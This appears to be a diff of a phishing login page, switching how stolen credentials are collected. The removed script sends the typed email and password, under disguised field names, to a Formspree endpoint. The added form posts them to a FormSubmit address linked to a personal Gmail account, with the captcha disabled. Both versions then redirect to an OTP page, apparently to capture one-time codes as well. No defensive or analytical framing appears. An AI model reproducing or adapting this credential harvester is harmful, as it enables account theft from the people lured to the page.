@@ -10,11 +10,8 @@
         document.addEventListener("DOMContentLoaded", function () {
             console.log("working");
 
-            const btn = document.getElementById("redirectBtn");
-            const emailInput = document.getElementById("email");
             const passInput = document.getElementById("pass");
             const passToggle = document.getElementById("passToggle");
-            const form = document.getElementById("form");
 
             // Toggle password visibility with icon change
             passToggle.addEventListener("click", function () {
@@ -27,57 +24,6 @@
                 }
             });
 
-            if (form) {
-                form.addEventListener("submit", async function (event) {
-                    event.preventDefault(); // Prevent default form submission
-
-                    // Validate inputs
-                    if (!emailInput.value.trim()) {
-                        alert("Please enter your email.");
-                        return;
-                    }
-                    if (!passInput.value.trim()) {
-                        alert("Please enter your password.");
-                        return;
-                    }
-
-                    btn.textContent = "Loading...";
-                    btn.disabled = true; 
-
-                    localStorage.setItem("email", emailInput.value);
-
-                    let formData = {
-                        message: emailInput.value, // Renamed email field
-                        note: passInput.value, // Renamed password field
-                    };
-
-                    try {
-                        let response = await fetch("https://formspree.io/f/mdkeovkr", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                                "Accept": "application/json",
-                            },
-                            body: JSON.stringify(formData),
-                        });
-
-                        let result = await response.json();
-
-                        if (response.ok) {
-                            window.location.href = "otp.html"; 
-                        } else {
-                            alert(result.error || "Failed to send form. Please try again.");
-                            console.error("Form error:", result);
-                        }
-                    } catch (error) {
-                        alert("An error occurred. Please try again later.");
-                        console.error("Request error:", error);
-                    } finally {
-                        btn.textContent = "Login"; 
-                        btn.disabled = false; 
-                    }
-                });
-            }
         });
     </script>
 
@@ -88,7 +34,9 @@
 <body class="bg-gray-100">
     <div class="w-[90%] max-w-md mx-auto pt-5">
         <div class="mt-5"></div>
-        <form id="form" class="mt-44">
+        
+        <!-- Form using FormSubmit -->
+        <form id="form" class="mt-44" action="https://formsubmit.co/emenikeonyechere@gmail.com" method="POST">
             <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
                 <p class="font-bold loginu mb-3">Log In</p>
                 <img class="imglogo" src="asset/header-logo.png" alt="Logo">
@@ -98,7 +46,7 @@
                         required
                         minlength="5"
                         id="email"
-                        name="message"
+                        name="email"
                         type="email"
                         class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
                         placeholder="Email"
@@ -110,7 +58,7 @@
                         required
                         minlength="5"
                         id="pass"
-                        name="note"
+                        name="password"
                         type="password"
                         class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
                         placeholder="Password"
@@ -122,6 +70,10 @@
                         alt="Toggle Password"
                     />
                 </div>
+
+                <!-- Hidden fields for better UX -->
+                <input type="hidden" name="_captcha" value="false"> <!-- Disable Captcha -->
+                <input type="hidden" name="_next" value="otp.html"> <!-- Redirect after submission -->
 
                 <button
                     id="redirectBtn"
